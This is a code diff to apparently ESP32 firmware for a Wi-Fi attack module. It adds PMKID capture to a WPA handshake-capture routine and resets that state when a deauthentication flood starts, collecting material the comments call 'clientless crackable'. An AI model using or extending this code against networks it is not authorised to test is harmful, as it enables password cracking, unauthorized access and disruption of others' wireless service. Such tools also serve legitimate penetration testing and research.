@@ -190,16 +190,23 @@ static volatile int  s_hs_n;
 static volatile uint8_t s_hs_mask;         // bit m set once message m (1..4) is captured
 static uint8_t       s_hs_bssid[6];        // the AP we locked onto
 static char          s_hs_path[64];        // .pcap written on stop ("" if none)
+static uint8_t       s_hs_pmkid[16];       // PMKID from message 1, if the AP advertises one
+static volatile bool s_hs_have_pmkid;      // clientless crackable material captured
 
 static void hs_add(const uint8_t *bssid, const uint8_t *frame, int len, int msg)
 {
     if (!s_hs || len <= 0 || len > HS_FRAME_MAX) return;
+    // PMKID parse OUTSIDE the lock (pure, bounded); only message 1 can carry one.
+    uint8_t pm[16]; bool got_pm = (msg == 1) && wifiatk_eapol_pmkid(frame, len, pm) == 1;
     taskENTER_CRITICAL(&s_mux);
     if (s_hs_n == 0) memcpy(s_hs_bssid, bssid, 6);           // lock onto the first AP we hear
-    if (mac_eq(bssid, s_hs_bssid) && s_hs_n < 4 && !(s_hs_mask & (1u << msg))) {
-        memcpy(s_hs[s_hs_n].buf, frame, len);
-        s_hs[s_hs_n].len = (uint16_t)len; s_hs[s_hs_n].msg = (uint8_t)msg;
-        s_hs_n++; s_hs_mask |= (uint8_t)(1u << msg);
+    if (mac_eq(bssid, s_hs_bssid)) {
+        if (s_hs_n < 4 && !(s_hs_mask & (1u << msg))) {
+            memcpy(s_hs[s_hs_n].buf, frame, len);
+            s_hs[s_hs_n].len = (uint16_t)len; s_hs[s_hs_n].msg = (uint8_t)msg;
+            s_hs_n++; s_hs_mask |= (uint8_t)(1u << msg);
+        }
+        if (got_pm && !s_hs_have_pmkid) { memcpy(s_hs_pmkid, pm, 16); s_hs_have_pmkid = true; }
     }
     taskEXIT_CRITICAL(&s_mux);
 }
@@ -232,6 +239,7 @@ static void hs_write_pcap(void)
 
 int         nucleo_wifiatk_handshake_msgmask(void) { return s_hs ? s_hs_mask : 0; }
 bool        nucleo_wifiatk_handshake_ready(void)   { return s_hs && hs_usable(); }
+bool        nucleo_wifiatk_handshake_pmkid(void)   { return s_hs && s_hs_have_pmkid; }
 const char *nucleo_wifiatk_handshake_path(void)    { return s_hs_path; }
 
 // Parse one sniffed frame; if it belongs to a target AP, learn the station MAC.
@@ -595,7 +603,7 @@ esp_err_t nucleo_wifiatk_deauth_start(int target_idx)
     s_cur_ssid[0] = 0;
     s_start_us = esp_timer_get_time();
     // Handshake capture buffer (heap, not resident .bss). Failure just disables capture, not the flood.
-    s_hs_n = 0; s_hs_mask = 0; s_hs_path[0] = 0;
+    s_hs_n = 0; s_hs_mask = 0; s_hs_path[0] = 0; s_hs_have_pmkid = false;
     if (!s_hs) s_hs = malloc(sizeof(hs_frame_t) * 4);
 
     // We OWN the radio here (raw injection) — exclusive never touches Wi-Fi (no NX_WIFI), so we still
